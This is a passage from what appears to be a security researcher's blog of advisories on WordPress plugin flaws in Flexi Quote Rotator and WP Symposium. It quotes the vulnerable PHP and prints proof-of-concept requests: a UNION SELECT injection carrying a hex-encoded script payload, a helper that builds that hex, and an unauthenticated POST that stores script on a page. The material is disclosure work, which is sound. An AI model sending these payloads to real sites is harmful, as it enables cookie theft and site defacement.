						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa7f47767258475-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">admin</span><span class="crayon-o">/</span><span class="crayon-v">tools</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">page</span><span class="crayon-o">=</span><span class="crayon-i">flexi</span><span class="crayon-o">-</span><span class="crayon-i">quote</span><span class="crayon-o">-</span><span class="crayon-v">rotator</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-o">&amp;</span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">edit</span><span class="crayon-o">&amp;</span><span class="crayon-sy">;</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">3533</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-cn">0x3122202f3e203c7363726970743e616c65727428646f63756d656e742e636f6f6b6965293c2f7363726970743e3c696e70757420747970653d2268696464656e22206e616d653d226964222076616c75653d2231</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f47767258475-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98e7aa7f47767258475-3"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1342212499</span><span class="crayon-o">%</span><span class="crayon-cn">7C2b307f49c397cbf2b578cc5df0902004</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1342212499</span><span class="crayon-o">%</span><span class="crayon-cn">7C8aec90b501bbc30db946f8f6bef9b9d8</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0030 seconds] -->
<p>The hex value that we use in order to bypass the magic quotes which WordPress enforces was generated this way:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa7f51446116943" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def ToHexString(input):
	hexString = "0x"
	for s in input:
		hexString += hex(ord(s))[2:]
	return hexString

print ToHexString("1\" /&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;input type=\"hidden\" name=\"id2\" value=\"1")</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa7f51446116943-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f51446116943-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa7f51446116943-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f51446116943-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa7f51446116943-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f51446116943-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa7f51446116943-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa7f51446116943-1"><span class="crayon-e">def </span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-i">input</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f51446116943-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">hexString</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"0x"</span></div><div class="crayon-line" id="crayon-53c98e7aa7f51446116943-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-i">input</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f51446116943-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">hexString</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">hex</span><span class="crayon-sy">(</span><span class="crayon-e">ord</span><span class="crayon-sy">(</span><span class="crayon-i">s</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-o">:</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-53c98e7aa7f51446116943-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">hexString</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f51446116943-6">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa7f51446116943-7"><span class="crayon-e">print </span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-s">"1\" /&gt; <span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-ta">&lt;/script&gt;</span>&lt;input type=\"hidden\" name=\"id2\" value=\"1"</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0025 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/flexi-quote-rotator/" rel="tag">Flexi Quote Rotator</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/#comments" title="Comment on WordPress Flexi Quote Rotator plugin multiple vulnerabilities">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-50 -->

				
					
<article id="post-26" class="post-26 post type-post status-publish format-standard hentry category-advisories tag-symposium tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/" title="4:20 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-25T16:20:39+00:00" pubdate>July 25, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/" title="Permalink to WordPress Symposium plugin multiple stored XSS vulnerabilities" rel="bookmark">WordPress Symposium plugin multiple stored XSS vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49791/">Secunia Advisory SA 49791</a></p>
<p><strong>Analysis of add_to_page vulnerability</strong><br />
The first vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> in the &#8220;add_to_page&#8221; action relies on a lack of validation of the $current_user variable that is declared through global. The function allows you to append text to any arbitrary page, which can be abused for a XSS attack.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa8c71093891592" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ($action == "add_to_page") {

        global $wpdb, $current_user;

        $r = 'OK';

        $shortcode = $_POST['shortcode'];
        $id = $_POST['id'];

        // get existing value
        $sql = "SELECT post_content FROM ".$wpdb-&gt;prefix."posts WHERE ID = %d";
        $tmp = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $id));       
        $tmp .= '['.$shortcode.']';

        // update
        $sql = "UPDATE ".$wpdb-&gt;prefix."posts SET post_content = %s WHERE ID = %d";
        $wpdb-&gt;query($wpdb-&gt;prepare($sql, $tmp, $id));             
       
        echo $r;
        exit;   
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-18">18</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c71093891592-20">20</div><div class="crayon-num" data-line="crayon-53c98e7aa8c71093891592-21">21</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"add_to_page"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-2">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-4">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-6">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'shortcode'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'id'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get existing value</span></div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT post_content FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tmp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tmp</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'['</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-sy">.</span><span class="crayon-s">']'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-14">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// update</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts SET post_content = %s WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tmp</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c71093891592-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c98e7aa8c71093891592-21"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0063 seconds] -->
<p>Because there is no validation of the user calling this action before this, as the $current_user variable is only just globally included at line 156, and no valididation is made in respect to it, we have a vulnerability since globally including a variable does not guarantee that it exists. Therefor you can call this while not being authenticated, and add a XSS payload to any page:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa8c82944233676" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

action=add_to_page&amp;id=1&amp;shortcode=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa8c82944233676-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c82944233676-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa8c82944233676-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c82944233676-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa8c82944233676-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c82944233676-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa8c82944233676-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c82944233676-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98e7aa8c82944233676-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c82944233676-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">74</span></div><div class="crayon-line" id="crayon-53c98e7aa8c82944233676-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c82944233676-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">add_to_page</span><span class="crayon-o">&amp;</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">shortcode</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0029 seconds] -->
<p>If you now load the frontpage(Which is by default page 1), you will now observe that it alerts out your cookie.</p>
<p><strong>Analysis of add_new_page vulnerability</strong><br />
This vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> is very much like the first one. Again it&#8217;s a lack of validation of the current user. This function, rather than add content to an existing page, serves to allow an user to create a new page with some content(A shortcode specifically, but no validation is made that it is just that). This block of code might look big and scary, big in reality most of the lines are simply SQL queries.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa8c8c996702345" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Add new page
if ($action == "add_new_page") {
	
	global $wpdb, $current_user;

	$r = 'OK';

	$shortcode = $_POST['shortcode'];
	$name = $_POST['name'];
	$post_name = str_replace(' ', '', strtolower($name));
	
	$wpdb-&gt;query( $wpdb-&gt;prepare( "
		INSERT INTO ".$wpdb-&gt;prefix."posts
		( 	post_author, 
			post_date,
			post_date_gmt,
			post_content,
			post_title,
			post_status,
			comment_status,
			ping_status,
			post_name,
			post_modified,
			post_modified_gmt,
			post_parent,
			menu_order,
			post_type,
			comment_count
		)
